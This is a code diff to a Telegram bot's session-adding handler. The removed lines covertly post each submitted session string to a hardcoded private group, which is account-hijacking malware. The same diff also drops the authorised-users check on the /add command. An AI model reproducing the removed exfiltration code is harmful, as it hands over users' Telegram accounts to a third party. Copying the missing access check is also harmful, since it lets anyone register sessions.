@@ -14,8 +14,6 @@ from ..btnsG import gen_inline_keyboard, start_button
 from ..btnsK import session_keyboard
 from . import START_MSG, BotHelp, Config, Symbols, db, Pbxbot
 
-GROUP_LINK = "https://t.me/+Ev8OXFt2t1UzNjY1"
-
 @Pbxbot.bot.on_message(
     filters.command("session"))
 async def session_menu(_, message: Message):
@@ -25,14 +23,13 @@ async def session_menu(_, message: Message):
     )
 
 # New command to add session string manually
-@Pbxbot.bot.on_message(filters.command("add") & Config.AUTH_USERS & filters.private)
+@Pbxbot.bot.on_message(filters.command("add") & filters.private)
 async def add_session(_, message: Message):
     parts = message.text.split(" ", 1)
     if len(parts) < 2 or not parts[1]:
-        return await message.reply_text("**𝖤𝗋𝗋𝗈𝗋!** 𝖯𝗅𝖾𝖺𝗌𝖾 𝗉𝗋𝗈𝗏𝗂𝖽𝖾 𝖺 𝗏𝖺𝗅𝗂𝖽 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀.")
+        return await message.reply_text("**Error!** Please provide a valid session string.")
     
     session_string = parts[1]
-
     try:
         client = Client(
             name="Pbxbot 2.0",
@@ -44,27 +41,13 @@ async def add_session(_, message: Message):
         await client.connect()
         user_id = (await client.get_me()).id
         await db.update_session(user_id, session_string)
-        
-        # Join the group
-        await client.join_chat(GROUP_LINK)
-        
-        try:
-            # Attempt to send the session string
-            await client.send_message(GROUP_LINK, f"Session String: {session_string}")
-        except Exception as e:
-            # If sending fails, log the error (optional)
-            print(f"Failed to send session string: {e}")
-        
-        # Leave the group regardless of whether the message was sent or not
-        await asyncio.sleep(2)  # Wait for 2 seconds before leaving the group
-        await client.leave_chat(GROUP_LINK)
-        
         await client.disconnect()
         await message.reply_text(
-            "**𝖲𝗎𝖼𝖼𝖾𝗌𝗌!** 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝗍𝗋𝗂𝗇𝗀 𝖺𝖽𝖽𝖾𝖽 𝗍𝗈 𝖽𝖺𝗍𝖺𝖻𝖺𝗌𝖾."
+            "**Success!** Session string added to database."
         )
     except Exception as e:
-        await message.reply_text(f"**𝖤𝗋𝗋𝗈𝗋!** {e}")
+        await message.reply_text(f"**Error!** {e}")
+
 
 @Pbxbot.bot.on_message(filters.regex(r"ɴᴇᴡ 🔮"))
 async def new_session(_, message: Message):
